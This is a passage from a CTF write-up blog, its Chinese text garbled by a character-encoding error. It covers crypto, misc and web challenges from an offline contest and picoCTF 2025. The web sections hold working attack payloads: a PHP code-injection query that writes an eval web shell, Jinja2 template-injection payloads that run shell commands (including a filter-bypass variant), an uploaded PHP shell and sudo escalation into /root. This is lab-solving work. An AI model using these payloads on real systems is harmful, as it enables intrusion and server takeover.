apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c</span> =<span class="hljs-meta"> [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152, </span><br><span class="hljs-meta">     78, 171, 12, 53, 105, 45, 12, 12, 53, 12, 171, 111, 91, 53, </span><br><span class="hljs-meta">     152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]</span><br><span class="hljs-attribute">flag</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">42</span>):<br>    <span class="hljs-attribute">for</span> j in range (<span class="hljs-number">128</span>):<br>        <span class="hljs-attribute">if</span> j * <span class="hljs-number">33</span> % <span class="hljs-number">179</span> == c[i]:<br>            <span class="hljs-attribute">flag</span>+=chr(j)<br><span class="hljs-attribute">print</span>(flag)<br><span class="hljs-comment">#flag&#123;2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca&#125;</span><br></code></pre></td></tr></table></figure><p>å†æ›¿æ¢ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20250714220218010.png" alt="image-20250714220218010"></p><h2 id="å¯†ç å­¦"><a href="#å¯†ç å­¦" class="headerlink" title="å¯†ç å­¦"></a>å¯†ç å­¦</h2><h3 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h3><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-14_21-50-12.png"></p><p>æ”¾åˆ°éšæ³¢é€æµé‡Œé¢èƒ½çœ‹åˆ°<code>Rot13</code>è§£ç ä¹‹åæ˜¯æ˜æ˜¾çš„16è¿›åˆ¶ç¼–ç å½¢å¼ï¼Œ<img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_09-48-42.png" alt="PixPin_2025-07-15_09-48-42"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_09-48-56.png" alt="PixPin_2025-07-15_09-48-56"></p><p>ç»è¿‡16è¿›åˆ¶è½¬å­—ç¬¦åç‰¹å¾å¾ˆæ˜æ˜¾ï¼Œæœ€åBase32-&gt;Base64-&gt;Ascii85æ··åˆè§£ç å¾—åˆ°flagã€‚<img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_09-49-13.png" alt="PixPin_2025-07-15_09-49-13"></p><h3 id="Crypto-10"><a href="#Crypto-10" class="headerlink" title="Crypto_10"></a>Crypto_10</h3><p>çœ‹åˆ°é¢˜ç›®æè¿°<code>é‡æ’æ—¶åº</code> <code>62æ˜Ÿåº</code>çŒœæµ‹å€’åºå’ŒBase62ã€‚</p><p><img src="D:\work\notebook\ontebook\CTF\é¢˜ç›®å¤ç°\å¾¡ç½‘æ¯2025çº¿ä¸‹wp\assets\PixPin_2025-07-15_09-54-38.png" alt="PixPin_2025-07-15_09-54-38"></p><p>å€’åºï¼š</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_09-59-44.png" alt="PixPin_2025-07-15_09-59-44"></p><p>Base62è§£ç ï¼š</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-00-08.png" alt="PixPin_2025-07-15_10-00-08"></p><h3 id="cryptoè§£å‹è¿™ä¸ªæ–‡ä»¶å¤¹"><a href="#cryptoè§£å‹è¿™ä¸ªæ–‡ä»¶å¤¹" class="headerlink" title="cryptoè§£å‹è¿™ä¸ªæ–‡ä»¶å¤¹"></a>cryptoè§£å‹è¿™ä¸ªæ–‡ä»¶å¤¹</h3><p>æ‰“å¼€ä¸‹è½½çš„é™„ä»¶ï¼Œæœ‰ä¸€ä¸ªå‹ç¼©åŒ…å’Œä¸€å¼ å›¾ç‰‡ã€‚ç›´æ¥è§£å‹æ–‡ä»¶å¤¹éœ€è¦å¯†ç ï¼Œå›¾ç‰‡ä¹Ÿä¸èƒ½ç›´æ¥æ‰“å¼€ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-04-44.png" alt="PixPin_2025-07-15_10-04-44"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-05-44.png" alt="PixPin_2025-07-15_10-05-44"></p><p>å›¾ç‰‡ç”¨010æ‰“å¼€å‘ç°æ–‡ä»¶å¤´æ˜¯é”™çš„ä¿®æ”¹ä¸€ä¸‹ï¼Œå¾—åˆ°è§£å‹å¯†ç ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-06-22.png" alt="PixPin_2025-07-15_10-06-22"></p><p>å‹ç¼©åŒ…è§£å‹å¾—åˆ°flag.jpgç›´æ¥æ”¾éšæ³¢é€æµé‡Œç„¶åbase64è§£ç ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-09-06.png" alt="PixPin_2025-07-15_10-09-06"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-09-42.png" alt="PixPin_2025-07-15_10-09-42"></p><p>å¾—åˆ°<code>ctf_you_passed</code>åŒ…è£¹flag{}å°±æ˜¯æœ€åçš„flagã€‚</p><h3 id="crypto-encryption2"><a href="#crypto-encryption2" class="headerlink" title="crypto encryption2"></a>crypto encryption2</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs stylus">fromÂ secretÂ importÂ init1,init2,init3,FLAG<br>importÂ hashlib<br><span class="hljs-function"><span class="hljs-title">assert</span><span class="hljs-params">(FLAG==<span class="hljs-string">&quot;flag&#123;&quot;</span>+hashlib.sha256(init1+init2+init3)</span></span><span class="hljs-selector-class">.hexdigest</span>()+<span class="hljs-string">&quot;&#125;&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-title">classlfsr</span><span class="hljs-params">()</span></span>:<br>Â  Â Â <span class="hljs-built_in">def__init__</span>(self, init, <span class="hljs-selector-tag">mask</span>, length):<br>Â  Â  Â  Â Â self<span class="hljs-selector-class">.init</span> = init<br>Â  Â  Â  Â Â self<span class="hljs-selector-class">.mask</span> = <span class="hljs-selector-tag">mask</span><br>Â  Â  Â  Â Â self<span class="hljs-selector-class">.lengthmask</span> =Â <span class="hljs-number">2</span>**(length+<span class="hljs-number">1</span>)-<span class="hljs-number">1</span><br><br>Â  Â Â <span class="hljs-built_in">defnext</span>(self):<br>Â  Â  Â  Â  nextdata = (self<span class="hljs-selector-class">.init</span> &lt;&lt;Â <span class="hljs-number">1</span>) &amp;Â self<span class="hljs-selector-class">.lengthmask</span>Â <br>Â  Â  Â  Â  <span class="hljs-selector-tag">i</span> =Â self<span class="hljs-selector-class">.init</span> &amp;Â self<span class="hljs-selector-class">.mask</span> &amp;Â self<span class="hljs-selector-class">.lengthmask</span>Â <br>Â  Â  Â  Â  output =Â <span class="hljs-number">0</span><br>Â  Â  Â  Â Â whileÂ <span class="hljs-selector-tag">i</span> !=Â <span class="hljs-number">0</span>:<br>Â  Â  Â  Â  Â  Â  output ^= (<span class="hljs-selector-tag">i</span> &amp;Â <span class="hljs-number">1</span>)<br>Â  Â  Â  Â  Â  Â  <span class="hljs-selector-tag">i</span> = <span class="hljs-selector-tag">i</span> &gt;&gt;Â <span class="hljs-number">1</span><br>Â  Â  Â  Â  nextdata ^= output<br>Â  Â  Â  Â Â self<span class="hljs-selector-class">.init</span> = nextdata<br>Â  Â  Â  Â Â returnÂ output<br><br><span class="hljs-function"><span class="hljs-title">defcombine</span><span class="hljs-params">(x1,x2,x3)</span></span>:<br>Â  Â Â returnÂ (x1*x2)^(x2*x3)^(x1*x3)<br><br><span class="hljs-keyword">if</span>Â __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>Â  Â  l1 = <span class="hljs-built_in">lfsr</span>(int<span class="hljs-selector-class">.from_bytes</span>(init1,<span class="hljs-string">&quot;big&quot;</span>),<span class="hljs-number">0</span>b100000000000000000000000010000000000000000000000,<span class="hljs-number">48</span>)<br>Â  Â  l2 = <span class="hljs-built_in">lfsr</span>(int<span class="hljs-selector-class">.from_bytes</span>(init2,<span class="hljs-string">&quot;big&quot;</span>),<span class="hljs-number">0</span>b100000000000000000000000000000000010000000000000,<span class="hljs-number">48</span>)<br>Â  Â  l3 = <span class="hljs-built_in">lfsr</span>(int<span class="hljs-selector-class">.from_bytes</span>(init3,<span class="hljs-string">&quot;big&quot;</span>),<span class="hljs-number">0</span>b100000100000000000000000000000000000000000000000,<span class="hljs-number">48</span>)<br><br>Â  Â Â <span class="hljs-built_in">withopen</span>(<span class="hljs-string">&quot;keystream&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)Â asÂ f:<br>Â  Â  Â  Â Â <span class="hljs-keyword">for</span>Â <span class="hljs-selector-tag">i</span>Â <span class="hljs-built_in">inrange</span>(<span class="hljs-number">8192</span>):<br>Â  Â  Â  Â  Â  Â  <span class="hljs-selector-tag">b</span> =Â <span class="hljs-number">0</span><br>Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">for</span>Â jÂ <span class="hljs-built_in">inrange</span>(<span class="hljs-number">8</span>):<br>Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-selector-tag">b</span> = (b&lt;&lt;<span class="hljs-number">1</span>)+<span class="hljs-built_in">combine</span>(l1<span class="hljs-selector-class">.next</span>(),l2<span class="hljs-selector-class">.next</span>(),l3<span class="hljs-selector-class">.next</span>())<br>Â  Â  Â  Â  Â  Â  f<span class="hljs-selector-class">.write</span>(<span class="hljs-built_in">chr</span>(b)<span class="hljs-selector-class">.encode</span>())<br></code></pre></td></tr></table></figure><h2 id="miscæ–¹å‘"><a href="#miscæ–¹å‘" class="headerlink" title="miscæ–¹å‘"></a>miscæ–¹å‘</h2><h3 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h3><p>é¢˜ç›®é™„ä»¶æ˜¯ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œç›´æ¥çˆ†ç ´ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-35-03.png" alt="PixPin_2025-07-15_10-35-03"></p><p>æ‰“å¼€æ–‡æ¡£å…¨é€‰å¤åˆ¶</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-35-37.png" alt="PixPin_2025-07-15_10-35-37"></p><p>ç²˜è´´ä¸€ä¸‹å°±èƒ½çœ‹åˆ°flag</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-36-31.png" alt="PixPin_2025-07-15_10-36-31"></p><h3 id="Misc2-é”®ç›˜æµé‡"><a href="#Misc2-é”®ç›˜æµé‡" class="headerlink" title="Misc2 é”®ç›˜æµé‡"></a>Misc2 é”®ç›˜æµé‡</h3><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-52-05.png" alt="PixPin_2025-07-15_10-52-05"></p><h3 id="Misc3-æ•°æ®åŒ…åˆ†æ"><a href="#Misc3-æ•°æ®åŒ…åˆ†æ" class="headerlink" title="Misc3 æ•°æ®åŒ…åˆ†æ"></a>Misc3 æ•°æ®åŒ…åˆ†æ</h3><p>é™„ä»¶é‡Œçš„<code>.exe</code>æ˜¯å‹ç¼©åŒ…ï¼Œä¿®æ”¹åç¼€è§£å‹ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_11-01-02.png" alt="PixPin_2025-07-15_11-01-02"></p><p>æ‰¾åˆ°æµé‡åŒ…å…¨å±€æœç´¢flagä»¥åŠflagå…¶ä»–ç¼–ç å½¢å¼ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_11-44-25.png" alt="PixPin_2025-07-15_11-44-25"></p><p>16è¿›åˆ¶è§£ç </p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_11-44-52.png" alt="PixPin_2025-07-15_11-44-52"></p><h3 id="Misc4å·¥ä¸šæµé‡åˆ†æ"><a href="#Misc4å·¥ä¸šæµé‡åˆ†æ" class="headerlink" title="Misc4å·¥ä¸šæµé‡åˆ†æ"></a>Misc4å·¥ä¸šæµé‡åˆ†æ</h3><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-54-46.png" alt="PixPin_2025-07-15_10-54-46"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-59-31.png" alt="PixPin_2025-07-15_10-59-31"></p><p>æŒ‰ç…§æ—¶é—´æ’åºï¼Œæœ€å…ˆSTOPçš„åŒ…ã€‚</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;ac6417423bb3000c&#125;</span><br></code></pre></td></tr></table></figure><h2 id="webæ–¹å‘"><a href="#webæ–¹å‘" class="headerlink" title="webæ–¹å‘"></a>webæ–¹å‘</h2><h3 id="web-rce"><a href="#web-rce" class="headerlink" title="web rce"></a>web rce</h3><h4 id="æ–¹æ³•ä¸€ï¼ˆæ‰“å°ç¼–ç çš„flagï¼‰"><a href="#æ–¹æ³•ä¸€ï¼ˆæ‰“å°ç¼–ç çš„flagï¼‰" class="headerlink" title="æ–¹æ³•ä¸€ï¼ˆæ‰“å°ç¼–ç çš„flagï¼‰"></a>æ–¹æ³•ä¸€ï¼ˆæ‰“å°ç¼–ç çš„flagï¼‰</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">ip/?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">print</span>(base64_encode(file_get_contents(base64_decode(<span class="hljs-string">&quot;ZmxhZy5waHA=&quot;</span>))));</span><br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•äºŒï¼ˆå†™å…¥webshellï¼‰"><a href="#æ–¹æ³•äºŒï¼ˆå†™å…¥webshellï¼‰" class="headerlink" title="æ–¹æ³•äºŒï¼ˆå†™å…¥webshellï¼‰"></a>æ–¹æ³•äºŒï¼ˆå†™å…¥webshellï¼‰</h4><p>ç›´æ¥å†™å…¥ä¸€ä¸ªwebshell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">file_put_contents(</span><br><span class="language-xml">    base64_decode(&quot;c2hlbGwucGhw&quot;),  // &quot;shell.php&quot;</span><br><span class="language-xml">    base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==&quot;)  // &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[x]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">);</span><br></code></pre></td></tr></table></figure><p>è¿›è¡Œç¼–ç åä¸ºï¼š</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">ip/?cmd=file_put_contents(<span class="hljs-built_in">base64_decode</span>(<span class="hljs-string">&quot;c2hlbGwucGhw&quot;</span>),<span class="hljs-built_in">base64_decode</span>(<span class="hljs-string">&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hd</span><br></code></pre></td></tr></table></figure><h3 id="web-äºŒæ¬¡ç¼–ç "><a href="#web-äºŒæ¬¡ç¼–ç " class="headerlink" title="web äºŒæ¬¡ç¼–ç "></a>web äºŒæ¬¡ç¼–ç </h3><p>ç›´æ¥è®¿é—®<code>/flag.php</code>å°±å¯ä»¥å¾—åˆ°<code>flag.php</code></p><h3 id="web-sql"><a href="#web-sql" class="headerlink" title="web sql"></a>web sql</h3><p>ç›´æ¥ç”¨sqlmapã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>picgoCTF2025wp</title>
    <link href="/2025/07/10/picgoCTF2025wp/"/>
    <url>/2025/07/10/picgoCTF2025wp/</url>
    
    <content type="html"><![CDATA[<h1 id="picgoCTF2025"><a href="#picgoCTF2025" class="headerlink" title="picgoCTF2025"></a>picgoCTF2025</h1><h2 id="SSTI1"><a href="#SSTI1" class="headerlink" title="SSTI1"></a>SSTI1</h2><p>SSTIæ¼æ´ä»‹ç»</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTIï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰æ¼æ´ï¼ˆå…¥é—¨ç¯‡ï¼‰ - bmjoker - åšå®¢å›­</a></p><p>ç»•è¿‡payload</p><p>[PayloadsAllTheThings&#x2F;Server Side Template Injection&#x2F;Python.md at master Â· swisskyrepo&#x2F;PayloadsAllTheThings Â· GitHub](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server</a> Side Template Injection&#x2F;Python.md?ref&#x3D;blog.qz.sg#jinja2â€”remote-command-execution)</p><p>è‡ªåŠ¨åŒ–å·¥å…·tplmap</p><p>githubåœ°å€ï¼š<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_10-28-18.png" alt="PixPin_2025-07-07_10-28-18"></p><p>æˆ‘ä»¬å¯ä»¥ä»headersä¸­çœ‹åˆ°å®ƒæ˜¯Pythonåº”ç”¨ç¨‹åºã€‚</p><p>å¦‚æœæˆ‘ä»¬ä½¿ç”¨ç»å…¸çš„<code>&#123;&#123;7*7&#125;&#125;</code> Python SSTIæµ‹è¯•ï¼Œæˆ‘ä»¬å°†è·å¾—ä»¥ä¸‹å†…å®¹ï¼Œè¿™è¡¨æ˜ç¡®å®æœ‰å·²ç¡®è®¤çš„SSTIã€‚</p><p><img src="D:\work\temp\PixPin_2025-07-07_14-19-19.png" alt="PixPin_2025-07-07_14-19-19"></p><p>æˆ‘ä»¬ä½¿ç”¨<code>&#123;&#123; config &#125;&#125;</code>æµ‹è¯•é…ç½®å¯¹è±¡ï¼Œæˆ‘ä»¬å°†è·å¾—ä»¥ä¸‹å†…å®¹ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_10-58-28.png" alt="PixPin_2025-07-07_10-58-28"></p><p>è¿™äº›è®¾ç½®æ˜¯å…¸å‹çš„ Flask é¡¹ç›®é…ç½®æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ã€‚æ²¡æœ‰ç›´æ¥æåˆ°å…·ä½“çš„æ¨¡æ¿å¼•æ“ï¼Œä½† Flask é»˜è®¤ä½¿ç”¨çš„æ˜¯ <strong>Jinja2</strong> ä½œä¸ºæ¨¡æ¿å¼•æ“ï¼Œé™¤äº† Flask å¤–ï¼Œè¿˜å¯ä»¥é…åˆå…¶ä»–æ¨¡æ¿å¼•æ“ã€‚</p><p>æŸ¥çœ‹ä¸€äº›æ¨¡æ¿RCEæ–¹æ³•[PayloadsAllTheThings&#x2F;Server Side Template Injection&#x2F;Python.md at master Â· swisskyrepo&#x2F;PayloadsAllTheThings Â· GitHub](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server</a> Side Template Injection&#x2F;Python.md?ref&#x3D;blog.qz.sg#jinja2â€”remote-command-execution)</p><p>ä»¥é€’å½’æ–¹å¼åˆ—å‡ºæ‰€æœ‰å·¥ä½œç›®å½•:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;request.application.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls -R&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>cat flag</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request.application.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="SSTI2"><a href="#SSTI2" class="headerlink" title="SSTI2"></a>SSTI2</h2><p>ä¸ SSTI1ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äºå­˜åœ¨æŸäº›å­—ç¬¦çš„é»‘åå•ã€‚æˆ‘ä»¬å¯ä»¥ç®€å•ä½¿ç”¨æ¨¡æ¿RCE</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_16-04-27.png" alt="PixPin_2025-07-07_16-04-27"></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(<span class="hljs-name">&#x27;application&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fimport\x5f\x5f&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;grep picoCTF . -rnw&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_16-06-59.png" alt="PixPin_2025-07-07_16-06-59"></p><h2 id="head-dump"><a href="#head-dump" class="headerlink" title="head-dump"></a>head-dump</h2><p>æŒ‰ç…§é¢˜ç›®æè¿°æ¥åš</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_17-56-02.png" alt="PixPin_2025-07-07_17-56-02"></p><p>æ‰¾åˆ°APIæ–‡æ¡£ï¼Œ</p><p><img src="D:\work\temp\PixPin_2025-07-07_15-48-55.png" alt="PixPin_2025-07-07_15-48-55"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_15-49-44.png" alt="PixPin_2025-07-07_15-49-44"></p><p>æ‰¾åˆ°å®‰è£…ç¨‹åºå®‰è£…ï¼Œ<img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_15-50-12.png" alt="PixPin_2025-07-07_15-50-12"></p><p>ä¸‹è½½åˆ°æœ¬åœ°æ‰“å¼€åç›´æ¥<code>ctri+F</code>æœç´¢å¾—åˆ°flag</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_15-53-06.png" alt="PixPin_2025-07-07_15-53-06"></p><h2 id="n0s4n1ty-1"><a href="#n0s4n1ty-1" class="headerlink" title="n0s4n1ty 1"></a>n0s4n1ty 1</h2><p>ç›´æ¥ä¸Šä¼ ä¸€ä¸ª <code>php  shell</code>ï¼Œæ–‡ä»¶ä¸Šä¼ æ²¡æœ‰å¯¹phpåšä»»ä½•è¿‡æ»¤ï¼Œæˆ‘ä»¬å¾—åˆ°äº†æ–‡ä»¶ä¸Šä¼ è·¯å¾„ä½†æ˜¯è¿ä¸ä¸Šèšå‰‘ã€‚ <img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_14-39-12.png" alt="PixPin_2025-07-07_14-39-12"></p><p>è¿›å…¥ä¸Šä¼ çš„è·¯å¾„å°†<code>whoami</code>ä½œä¸º<code>cmd</code>å‚æ•°ä»¥<code>?cmd=whoami</code>å‘é€ä»£ç æ‰§è¡Œã€‚è¿™æ„å‘³ç€æˆ‘ä»¬çš„webshellèµ·ä½œç”¨äº†ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_15-01-54.png" alt="PixPin_2025-07-07_15-01-54"></p><p>ç›´æ¥è¿›å…¥<code>/root</code>ç›®å½•æ˜¾ç¤ºæ‹’ç»è¯·æ±‚ã€‚</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">ls: cannot <span class="hljs-built_in">open</span> <span class="hljs-built_in">directory</span> <span class="hljs-string">&#x27;/root&#x27;</span>: Permission denied<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°è¯•æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯ä»¥ä½¿ç”¨<code>sudo -l</code>è¿è¡Œçš„å‘½ä»¤ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åœ¨ä¸éœ€è¦å¯†ç çš„æƒ…å†µä¸‹è¿è¡Œä»»ä½•å‘½ä»¤ã€‚ç›´æ¥sudoææƒ</p><p>æˆ‘ä»¬çŸ¥é“è¯¥flagåœ¨<code>/root</code>ä¸­ï¼Œå¹¶ä¸”å¯èƒ½åœ¨æŸäº›æ–‡æœ¬æ–‡ä»¶ä¸­ã€‚æˆ‘ä»¬å¯ä»¥<code>grep</code>æ‰€æœ‰æ–‡æœ¬æ–‡ä»¶ã€‚</p><p><strong>sudoææƒ</strong><br>sudoå‘½ä»¤ä»¥ç³»ç»Ÿç®¡ç†è€…çš„èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç»ç”± sudo æ‰€æ‰§è¡Œçš„æŒ‡ä»¤å°±å¥½åƒæ˜¯ root äº²è‡ªæ‰§è¡Œã€‚<br>sudo è¡¨ç¤º â€œsuperuser doâ€ã€‚ å®ƒå…è®¸å·²éªŒè¯çš„ç”¨æˆ·ä»¥å…¶ä»–ç”¨æˆ·çš„èº«ä»½æ¥è¿è¡Œå‘½ä»¤ã€‚å…¶ä»–ç”¨æˆ·å¯ä»¥æ˜¯æ™®é€šç”¨æˆ·æˆ–è€…è¶…çº§ç”¨æˆ·ã€‚ç„¶è€Œï¼Œå¤§éƒ¨åˆ†æ—¶å€™æˆ‘ä»¬ç”¨å®ƒæ¥ä»¥æå‡çš„æƒé™æ¥è¿è¡Œå‘½ä»¤ã€‚</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo <span class="hljs-keyword">grep</span> -rnw <span class="hljs-string">&#x27;/root&#x27;</span> -e <span class="hljs-string">&#x27;.*&#x27;</span> --<span class="hljs-keyword">include</span>=*.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_15-13-51.png" alt="PixPin_2025-07-07_15-13-51"></p><h2 id="3v-l"><a href="#3v-l" class="headerlink" title="3v@l"></a>3v@l</h2><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_16-15-35.png" alt="PixPin_2025-07-07_16-15-35"></p><h3 id="1-0x-0-9A-Fa-f"><a href="#1-0x-0-9A-Fa-f" class="headerlink" title="1. 0x[0-9A-Fa-f]+"></a>1. <code>0x[0-9A-Fa-f]+</code></h3><h4 id="âœ…-åŒ¹é…-åå…­è¿›åˆ¶ç¼–ç "><a href="#âœ…-åŒ¹é…-åå…­è¿›åˆ¶ç¼–ç " class="headerlink" title="âœ… åŒ¹é… åå…­è¿›åˆ¶ç¼–ç "></a>âœ… åŒ¹é… <strong>åå…­è¿›åˆ¶ç¼–ç </strong></h4><ul><li>ç”¨é€”ï¼šç»•è¿‡æ•æ„Ÿå­—ç¬¦ä¸²æ£€æµ‹ï¼Œä¾‹å¦‚ï¼š<ul><li><code>0x6f</code> æ˜¯å­—ç¬¦ <code>o</code></li><li><code>0x7368</code> æ˜¯ <code>sh</code></li></ul></li><li>å¯è¢«æ‹¼æ¥æˆï¼š<code>0x6f + 0x73</code> â†’ <code>os</code></li></ul><hr><h3 id="2-u-0-9A-Fa-f-4"><a href="#2-u-0-9A-Fa-f-4" class="headerlink" title="2. \\u[0-9A-Fa-f]{4}"></a>2. 